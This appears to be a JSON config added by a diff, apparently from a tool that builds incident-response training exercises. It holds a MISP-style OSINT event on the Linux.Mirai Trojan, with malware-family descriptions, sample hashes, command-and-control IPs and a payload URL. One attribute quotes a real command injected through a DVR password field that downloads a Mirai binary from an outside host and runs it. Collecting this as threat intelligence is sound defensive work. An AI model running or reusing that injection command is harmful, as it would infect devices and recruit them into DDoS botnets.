@@ -1,0 +1,239 @@
+{
+  "generated_at_utc": "2026-10-08T10:49:21.746058+00:00",
+  "user_inputs": {
+    "scenario_type": "Exercise",
+    "difficulty_level": "Intermediate",
+    "cybersecurity_approach": "Defence-oriented",
+    "nice_role": "Incident Response",
+    "number_of_tasks": 3,
+    "question_response": "true",
+    "hints": "true",
+    "threat_name": "OSINT - Investigation of Linux.Mirai Trojan family",
+    "mitre_attack_techniques": [],
+    "environment_constraints": null,
+    "hybrid_sandbox": false,
+    "evaluate": true
+  },
+  "agent_1": {
+    "model_used": "",
+    "query_generated": "OSINT - Investigation of Linux.Mirai Trojan family"
+  },
+  "retrieval": {
+    "retrieved_events": {
+      "event_uuid": "57ef6d48-20c8-4e55-9f02-468f950d210f",
+      "event_id": "459",
+      "event_info": "OSINT - Investigation of Linux.Mirai Trojan family",
+      "galaxies": [
+        {
+          "cluster_description": "Monero-mining malware",
+          "cluster_value": "CoinMiner",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        },
+        {
+          "cluster_description": "Xbash is a malware family that is targeting Linux and Microsoft Windows servers. We can tie this malware, which we have named Xbash, to the Iron Group, a threat actor group known for previous ransomware attacks. Xbash was developed using Python and converted into self-contained Linux ELF executables by abusing the legitimate tool PyInstaller for distribution. Xbash aimed on discovering unprotected services, deleting victim\u2019s MySQL, PostgreSQL and MongoDB databases, and ransom for Bitcoins. Linux based systems are targeted for ransomware and botnet capabilities. The ransomware targets and deletes linux databases and there is no evidence of any functionality that makes recovery even possible by payment the ransom. Where as, windows based systems are targeted for coinmining & self-propagating capabilities. Xbash spreads by attacking weak passwords and unpatched vulnerabilities.",
+          "cluster_value": "Xbash",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        },
+        {
+          "cluster_description": "",
+          "cluster_value": "Gafgyt",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        },
+        {
+          "cluster_description": "According to a report Li shared with Bleeping Computer today, the Mirai Satori variant is quite different from all previous pure Mirai variants.Previous Mirai versions infected IoT devices and then downloaded a Telnet scanner component that attempted to find other victims and infect them with the Mirai bot.The Satori variant does not use a scanner but uses two embedded exploits that will try to connect to remote devices on ports 37215 and 52869.Effectively, this makes Satori an IoT worm, being able to spread by itself without the need for separate components.",
+          "cluster_value": "Satori",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        },
+        {
+          "cluster_description": "CowerSnail was compiled using Qt and linked with various libraries. This framework provides benefits such as cross-platform capability and transferability of the source code between different operating systems. ",
+          "cluster_value": "CowerSnail",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        },
+        {
+          "cluster_description": "Family of related sophisticated backdoor software - Name comes from Microsoft detection signature \u2013 anagram of Ultra (Ultra3) was a name of the fake driver). A macOS version exists but appears incomplete and lacking features...for now!",
+          "cluster_value": "Turla",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        },
+        {
+          "cluster_description": "Mirai (Japanese for \"the future\") is malware that turns computer systems running Linux into remotely controlled \"bots\", that can be used as part of a botnet in large-scale network attacks. It primarily targets online consumer devices such as remote cameras and home routers. The Mirai botnet has been used in some of the largest and most disruptive distributed denial of service (DDoS) attacks, including an attack on 20 September 2016 on computer security journalist Brian Krebs's web site, an attack on French web host OVH and the October 2016 Dyn cyberattack.",
+          "cluster_value": "Mirai",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        },
+        {
+          "cluster_description": "METASPLOIT is a penetration testing framework whose features include vulnerability testing, network enumeration, payload generation and execution, and defense evasion. Availability: Public",
+          "cluster_value": "metasploit",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        },
+        {
+          "cluster_description": "Cobalt Strike is a post-exploitation framework.",
+          "cluster_value": "Cobalt Strike",
+          "description": "Threat actors tools is an enumeration of tools used by adversaries. The list includes malware but also common software regularly used by the adversaries.",
+          "name": "Tool",
+          "type": "tool"
+        }
+      ],
+      "tags": [
+        "type:OSINT",
+        "circl:incident-classification=\"malware\"",
+        "ms-caro-malware:malware-platform=\"Linux\"",
+        "ms-caro-malware:malware-type=\"DDoS\"",
+        "misp-galaxy:tool=\"Mirai\""
+      ],
+      "event_attributes": [
+        {
+          "category": "External analysis",
+          "comment": "Dr.WEB - Investigation of Linux.Mirai Trojan family",
+          "type": "attachment",
+          "value": "Investigation_of_Linux.Mirai_Trojan_family_en.pdf"
+        },
+        {
+          "category": "External analysis",
+          "comment": "",
+          "type": "comment",
+          "value": "A Trojan for Linux that was named  Linux.Mirai has several predecessors. The first malware program belonging  to  this  family  was  spotted  in  May  2016  and  was  dubbed  Linux.DDoS.87.  At  the  beginning  of August,  a  new  version  of  this  Trojan Linux.DDoS.89 was  discovered.  Finally,  Doctor  Web\u00e2\u20ac\u2122s  security researchers investigated the \r\nLinux.Mirai Trojan found later that month."
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "ARM",
+          "type": "sha1",
+          "value": "8fd0d16edf270c453c5b6b2481d0a044a410c7cd"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "x86",
+          "type": "sha1",
+          "value": "c129e2a23abe826f808725a0724f12470502a3cc"
+        },
+        {
+          "category": "Artifacts dropped",
+          "comment": "",
+          "type": "filename",
+          "value": ".shinigami"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "ARM",
+          "type": "sha1",
+          "value": "9ff383309ad63da2caa9580d7d85abeece9b13a0"
+        },
+        {
+          "category": "Network activity",
+          "comment": "",
+          "type": "ip-dst",
+          "value": "5.206.225.122"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "",
+          "type": "url",
+          "value": "http://5.206.225.122/bins/mirai.arm"
+        },
+        {
+          "category": "Network activity",
+          "comment": "",
+          "type": "ip-dst",
+          "value": "151.80.99.84"
+        },
+        {
+          "category": "External analysis",
+          "comment": "",
+          "type": "link",
+          "value": "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=4477"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "The malware was installed on a dvr and was started with this bash injection in password field",
+          "type": "comment",
+          "value": "Password=;tftp -l /dev/dvrHelper -r mirai.arm -g 151.80.99.84 || wget http://5.206.225.122/bins/mirai.arm -O /dev/dvrHelper; chmod 777 /dev/dvrHelper; cd /dev; ./dvrHelper 2>&1;/bin/busybox MIRAI 2>&1;"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "ARM - Xchecked via VT: 9ff383309ad63da2caa9580d7d85abeece9b13a0",
+          "type": "md5",
+          "value": "78440b86e34579001bea6ebc600751f5"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "ARM - Xchecked via VT: 9ff383309ad63da2caa9580d7d85abeece9b13a0",
+          "type": "sha256",
+          "value": "f8fcaa18be035d0448de7db6781c5e495b665bd3844119171714431a3c1aedbc"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "ARM - Xchecked via VT: 8fd0d16edf270c453c5b6b2481d0a044a410c7cd",
+          "type": "sha256",
+          "value": "7cf5d0188e43a9a46676d8e71dc251c0871b23eff9d66f89d7eabaeba7a3d2cc"
+        },
+        {
+          "category": "External analysis",
+          "comment": "ARM - Xchecked via VT: 9ff383309ad63da2caa9580d7d85abeece9b13a0",
+          "type": "link",
+          "value": "https://www.virustotal.com/file/f8fcaa18be035d0448de7db6781c5e495b665bd3844119171714431a3c1aedbc/analysis/1465114448/"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "ARM - Xchecked via VT: 8fd0d16edf270c453c5b6b2481d0a044a410c7cd",
+          "type": "md5",
+          "value": "e64079b3ccf906204474beca1f5cc41d"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "x86 - Xchecked via VT: c129e2a23abe826f808725a0724f12470502a3cc",
+          "type": "sha256",
+          "value": "45b7fa5ad2eae5b32b15ccef313713a37481b6178c4c8bbbb524822a56883b56"
+        },
+        {
+          "category": "External analysis",
+          "comment": "ARM - Xchecked via VT: 8fd0d16edf270c453c5b6b2481d0a044a410c7cd",
+          "type": "link",
+          "value": "https://www.virustotal.com/file/7cf5d0188e43a9a46676d8e71dc251c0871b23eff9d66f89d7eabaeba7a3d2cc/analysis/1464739147/"
+        },
+        {
+          "category": "External analysis",
+          "comment": "x86 - Xchecked via VT: c129e2a23abe826f808725a0724f12470502a3cc",
+          "type": "link",
+          "value": "https://www.virustotal.com/file/45b7fa5ad2eae5b32b15ccef313713a37481b6178c4c8bbbb524822a56883b56/analysis/1465114403/"
+        },
+        {
+          "category": "Payload delivery",
+          "comment": "x86 - Xchecked via VT: c129e2a23abe826f808725a0724f12470502a3cc",
+          "type": "md5",
+          "value": "5d25f735cf059d6b4076947860da5c45"
+        }
+      ],
+      "objects": [],
+      "reports": []
+    }
+  },
+  "agent_2": {
+    "model_used": "mistral-small3.2:latest",
+    "retrieved_nice_information": "nice_info",
+    "prompt": {
+      "type": "str",
+      "repr": "'(prompt stored in agent2 file)'"
+    }
+  },
+  "agent_3": {
+    "model_used": "mistral-small3.2:latest",
+    "prompt": {
+      "type": "str",
+      "repr": "'(prompt stored in agent3 file)'"
+    }
+  }
+}
